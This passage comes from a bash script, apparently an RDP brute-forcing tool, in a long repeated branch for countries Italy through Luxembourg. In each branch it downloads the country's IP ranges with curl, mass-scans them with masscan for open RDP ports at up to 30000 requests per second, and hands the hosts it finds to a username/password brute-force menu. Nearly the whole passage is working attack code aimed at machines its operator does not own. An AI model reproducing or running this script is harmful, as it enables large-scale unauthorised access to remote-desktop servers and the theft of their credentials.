echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "90" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ITALY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Italy://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "91" ]; then
curl http://services.ce3c.be/ciprg/?countrys=JAMAICA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Jamaica://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "92" ]; then
curl http://services.ce3c.be/ciprg/?countrys=JAPAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Japan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "93" ]; then
curl http://services.ce3c.be/ciprg/?countrys=JORDAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Jordan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "94" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KAZAKHSTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Kazakhstan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "95" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KENYA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Kenya://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "96" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KIRIBATI|grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Kiribati://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "97" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KOREA+DEMOCRATIC+PEOPLE%27S+REPUBLIC+OF%2C |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Korea Democratic People's Republic of://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "98" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KUWAIT |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Kuwait://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "99" ]; then
curl http://services.ce3c.be/ciprg/?countrys=KYRGYZSTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Kyrgyzstan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "100" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LAO+PEOPLE%27S+DEMOCRATIC+REPUBLIC%2C |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Lao People's Democratic Republic://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "101" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LATVIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Latvia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "102" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LEBANON |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Lebanon://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "103" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LESOTHO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Lesotho://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "104" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LIBYAN+ARAB+JAMAHIRIYA%2C |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Libyan Arab Jamahiriya://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "105" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LIECHTENSTEIN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Liechtenstein://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "106" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LITHUANIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Lithuania://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "107" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LUXEMBOURG |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Luxembourg://g">list
